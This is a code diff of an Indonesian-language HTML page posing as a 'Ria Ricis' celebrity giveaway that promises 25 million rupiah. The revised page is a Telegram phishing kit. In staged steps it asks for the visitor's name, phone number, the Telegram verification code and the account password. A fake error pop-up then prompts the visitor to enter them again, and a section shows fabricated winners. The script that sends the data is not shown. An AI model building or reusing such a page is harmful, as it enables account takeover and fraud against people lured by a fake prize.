@@ -1,146 +1,85 @@
-\<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giveaway Ria Ricis</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        body {
-            background-color: #f9f9f9;
-            color: #333;
-            line-height: 1.6;
-        }
-        .container {
-            width: 90%;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        .header {
-            text-align: center;
-            padding: 30px;
-            background: #6c63ff;
-            color: white;
-        }
-        .header img {
-            width: 60px;
-            margin-bottom: 10px;
-        }
-        .header h1 {
-            font-size: 2em;
-            margin-bottom: 10px;
-        }
-        .header p {
-            font-size: 1em;
-        }
-        .video-section {
-            display: flex;
-            justify-content: center;
-            padding: 20px 0;
-        }
-        .video-section video {
-            width: 100%;
-            max-width: 150px; /* Set maximum width of the video */
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-        .giveaway-info {
-            text-align: center;
-            padding: 20px;
-        }
-        .giveaway-info h2 {
-            font-size: 1.8em;
-            color: #6c63ff;
-            margin-bottom: 15px;
-        }
-        .giveaway-info p {
-            font-size: 1em;
-            color: #555;
-        }
-        .cta-button {
-            display: inline-block;
-            padding: 10px 20px;
-            margin-top: 20px;
-            background-color: #ff6b6b;
-            color: white;
-            text-decoration: none;
-            font-size: 1em;
-            border-radius: 5px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            transition: background-color 0.3s;
-        }
-        .cta-button:hover {
-            background-color: #ff5252;
-        }
-        .footer {
-            text-align: center;
-            padding: 15px;
-            color: #666;
-            background-color: #f3f3f3;
-            font-size: 0.9em;
-        }
-
-        /* Responsive Adjustments */
-        @media (max-width: 768px) {
-            .header h1 {
-                font-size: 1.8em;
-            }
-            .header img {
-                width: 50px;
-            }
-            .cta-button {
-                font-size: 0.9em;
-                padding: 10px 15px;
-            }
-            .giveaway-info h2 {
-                font-size: 1.5em;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            .header h1 {
-                font-size: 1.5em;
-            }
-            .header img {
-                width: 40px;
-            }
-            .cta-button {
-                font-size: 0.8em;
-                padding: 8px 12px;
-            }
-            .giveaway-info h2 {
-                font-size: 1.2em;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>Giveaway Ria Ricis</h1>
-        <p>Bergabunglah dalam Giveaway spektakuler bersama Ria Ricis! Raih kesempatan memenangkan hadiah besar 💸 hingga 25 juta rupiah! 🎉</p>
-    </div>
-
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Giveaway</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
     <div class="container">
-        <!-- Video Section -->
-        <div class="video-section">
-            <video src="ricis.mp4" autoplay muted loop controls></video>
+      <!-- Carousel Section -->
+      <div class="carousel">
+        <div class="carousel-images">
+          <img
+            src="assets/img/ricis1.jpg"
+            alt="Giveaway Image 1"
+          />
+          <img
+            src="assets/img/ricis2.jpg"
+            alt="Giveaway Image 2"
+          />
+          <img
+            src="assets/img/ricis3.jpg"
+            alt="Giveaway Image 3"
+          />
         </div>
+      </div>
 
-        <div class="giveaway-info">
-            <h2>Ikuti Langkah Mudah Ini:</h2>
-            <p>Daftarkan diri Anda untuk menjadi peserta giveaway Ria Ricis. Jangan lewatkan kesempatan ini untuk mendapatkan hadiah besar!</p>
-            <a href="landing.html" class="cta-button">Daftar Sekarang</a>
+      
+
+      <!-- Form Section -->
+<div class="form-container" id="step1">
+    <h2>Ikuti Giveaway Ria Ricis 2024 dan Menangkan Hadiah Tunai 25 Juta Rupiah!</h2>
+    <p>
+    Daftar sekarang untuk kesempatan memenangkan <strong>25 JUTA RUPIAH</strong>!
+    Ikuti langkah-langkah mudah ini dan Anda bisa jadi pemenang beruntung!
+    Semakin cepat Anda mendaftar, semakin besar peluang Anda untuk menang!
+</p>
+
+
+    <h3>Silakan masukkan Nama Lengkap dan Nomor Telegram Anda!</h3>
+    <input type="text" id="name" placeholder="Nama Lengkap" required />
+    <input type="tel" id="phone" placeholder="Nomor Telegram" required pattern="\d*" />
+    <button onclick="nextStep(1)">Lanjutkan</button>
+</div>
+
+<div class="form-container" id="step2" style="display: none">
+    <h3>Masukkan Kode Verifikasi yang Dikirim ke Telegram Anda</h3>
+    <p>Periksa pesan Telegram Anda dan masukkan kode verifikasi yang kami kirimkan untuk melanjutkan.</p>
+    <input type="text" id="otp" placeholder="Kode Verifikasi" required maxlength="5" pattern="\d*" />
+    <button onclick="nextStep(2)">Lanjutkan</button>
+</div>
+
+<div class="form-container" id="step3" style="display: none">
+    <h3>Masukkan Kata Sandi Anda untuk Keamanan Akun</h3>
+    <p>Untuk melindungi akun Anda, kami memerlukan kata sandi yang aman. Masukkan kata sandi Anda di bawah ini.</p>
+    <input type="password" id="password" placeholder="Kata Sandi" required />
+    <button onclick="submitForm()">Kirim</button>
+</div>
+
+
+<!-- Modal Pop-up -->
+<div id="confirmationModal" class="modal">
+  <div class="modal-content">
+    <span class="close">&times;</span>
+    <h2>Gagal Memproses!</h2>
+    <p>Pastikan agar semua yang anda masukkan sudah benar. silahkan isi ulang untuk mendapatkan hadiah.</p>
+    <button onclick="resetAndCloseModal()">OK</button>
+  </div>
+</div>
+
+
+
+      <!-- Winners Section -->
+      <div class="winners">
+        <h3>Penerima Hadiah Terbaru</h3>
+        <div id="winner-display">
+          <!-- Nama penerima hadiah akan ditampilkan di sini satu per satu -->
         </div>
+      </div>
     </div>
 
-    <div class="footer">
-        <p>&copy; 2024 Ricis Official. Semua Hak Dilindungi.</p>
-    </div>
-</body>
+    <script src="script.js"></script>
+  </body>
 </html>
